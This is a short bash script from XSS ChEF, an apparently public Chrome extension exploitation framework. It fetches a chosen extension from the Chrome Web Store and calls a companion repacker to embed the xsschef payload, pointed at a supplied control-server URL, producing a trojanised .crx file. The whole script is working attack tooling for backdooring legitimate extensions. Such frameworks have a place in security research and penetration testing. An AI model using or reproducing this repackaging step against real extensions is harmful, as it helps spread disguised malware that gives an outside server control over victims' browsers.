#!/usr/bin/env bash
#   XSS ChEF - Chrome Extension Exploitation framework
#    Copyright (C) 2012  Krzysztof Kotowicz - http://blog.kotowicz.net
#
#    This program is free software: you can redistribute it and/or modify
#    it under the terms of the GNU General Public License as published by
#    the Free Software Foundation, either version 3 of the License, or
#    (at your option) any later version.
#
#    This program is distributed in the hope that it will be useful,
#    but WITHOUT ANY WARRANTY; without even the implied warranty of
#    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
#    GNU General Public License for more details.
#
#    You should have received a copy of the GNU General Public License
#    along with this program.  If not, see <http://www.gnu.org/licenses/>.
#
# Usage:
# ./repacker-webstore.sh <extension-id> <xsschef-server-url> <output.crx>
#
# Will download extension from Google Chrome Webstore and replace
# the .crx file with a version with xsschef embedded.
RUNDIR=`pwd`
DIR=$( cd "$( dirname "$0" )" && pwd )
URL="https://clients2.google.com/service/update2/crx?response=redirect&x=id%3D${1}%26lang%3Dpl%26uc"
tempfoo=`basename $0`
TMPDIR=`mktemp -d -t ${tempfoo}` || exit 1

function cleanup {
    rm -rf "$TMPDIR"
    cd "$RUNDIR"
}

function bailout {
    echo "Error"
    cleanup
    exit 1
}

curl -L "$URL" -o "$TMPDIR/org.crx"
if (( $? )) ; then 
    bailout
fi
$DIR/repacker.sh "$TMPDIR/org.crx" "$3" "$2" repack || bailout 
rm $TMPDIR/org.crx
